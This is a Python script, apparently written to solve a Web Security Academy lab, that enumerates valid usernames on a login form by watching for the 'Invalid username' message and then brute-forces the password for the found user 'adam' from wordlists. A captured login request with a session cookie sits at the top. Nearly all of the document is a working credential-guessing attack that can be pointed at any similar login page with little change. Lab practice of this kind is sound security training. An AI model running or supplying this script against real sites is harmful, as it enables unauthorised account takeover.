'''
POST /login HTTP/2
Host: 0ab50076045e724c8b0cd1b400080062.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: https://0ab50076045e724c8b0cd1b400080062.web-security-academy.net
Connection: keep-alive
Referer: https://0ab50076045e724c8b0cd1b400080062.web-security-academy.net/login
Cookie: session=MUv3tzCeFWBxVbakNyjw3aDvsRpLE9Sj
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
TE: trailers

username=admin&password=admin
'''

import requests
import bs4

DOMAIN = "0ab50076045e724c8b0cd1b400080062.web-security-academy.net"
URL = f"https://{DOMAIN}/login"

headers = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Referer": f"https://{DOMAIN}/login",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "TE": "trailers"
}

cookies = {
    "session": "MUv3tzCeFWBxVbakNyjw3aDvsRpLE9Sj"
}

with open("usernames.dic", "r") as file:
    usernames_list = file.readlines()

with open("passwords.dic", "r") as file:
    passwords_list = file.readlines()

def enum_users(url, headers, cookies):
    correct_usernames = []
    data = {
        "username": "",
        "password": "admin"
    }
    for username in usernames_list:
        username = username.strip()
        
        data["username"] = username
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        soup = bs4.BeautifulSoup(response.text, "html.parser")
        if "Invalid username" not in soup.text:
            print(f"Username: {username}")
            correct_usernames.append(username)

    return correct_usernames

def brute_password(url, headers, cookies, correct_username):
    data = {
        "username": correct_username,
        "password": ""
    }
    for password in passwords_list:
        password = password.strip()
        data["password"] = password
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        soup = bs4.BeautifulSoup(response.text, "html.parser")
        if "Incorrect password" not in soup.text:
            print(f"Password: {password}")
            break


# enum_users(URL, headers, cookies) # adam
brute_password(URL, headers, cookies, "adam")